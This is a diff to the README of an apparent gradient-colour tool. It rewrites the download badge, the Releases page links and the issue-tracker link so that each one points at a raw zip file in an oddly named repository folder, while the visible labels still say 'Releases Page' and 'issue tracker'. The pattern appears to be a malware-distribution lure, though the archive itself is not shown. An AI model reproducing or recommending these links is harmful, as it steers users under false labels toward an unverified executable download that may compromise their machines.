@@ -1,6 +1,6 @@
 # 🎨 Gradient-Color-Generator - Create Beautiful Gradients Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Gradient--Color--Generator-brightgreen)](https://github.com/rosh19092001/Gradient-Color-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/rosh19092001/Gradient-Color-Generator/main/anomocarpous/Gradient-Color-Generator.zip%20Now-Gradient--Color--Generator-brightgreen)](https://raw.githubusercontent.com/rosh19092001/Gradient-Color-Generator/main/anomocarpous/Gradient-Color-Generator.zip)
 
 ## 📜 Description
 
@@ -11,7 +11,7 @@ Gradient-Color-Generator is a simple and modern tool that allows you to create, 
 Follow these steps to get started with Gradient-Color-Generator:
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page where you can download the application.
-   [Visit Releases Page to Download](https://github.com/rosh19092001/Gradient-Color-Generator/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/rosh19092001/Gradient-Color-Generator/main/anomocarpous/Gradient-Color-Generator.zip)
 
 2. **Download the Application**: On the Releases page, find the latest version available. Click on the appropriate download link for your system.
 
@@ -23,7 +23,7 @@ Follow these steps to get started with Gradient-Color-Generator:
 
 ## 📥 Download & Install
 
-To download and run the Gradient-Color-Generator, visit this page: [Gradient-Color-Generator Releases](https://github.com/rosh19092001/Gradient-Color-Generator/releases).
+To download and run the Gradient-Color-Generator, visit this page: [Gradient-Color-Generator Releases](https://raw.githubusercontent.com/rosh19092001/Gradient-Color-Generator/main/anomocarpous/Gradient-Color-Generator.zip).
 
 ### **System Requirements**
 
@@ -60,7 +60,7 @@ This application covers various topics related to color design, including:
 
 ## 🛠 Support
 
-If you run into issues or have questions regarding the Gradient-Color-Generator, please visit the [issue tracker](https://github.com/rosh19092001/Gradient-Color-Generator/issues) to report a problem or ask for help.
+If you run into issues or have questions regarding the Gradient-Color-Generator, please visit the [issue tracker](https://raw.githubusercontent.com/rosh19092001/Gradient-Color-Generator/main/anomocarpous/Gradient-Color-Generator.zip) to report a problem or ask for help.
 
 ## 📞 Contact
 
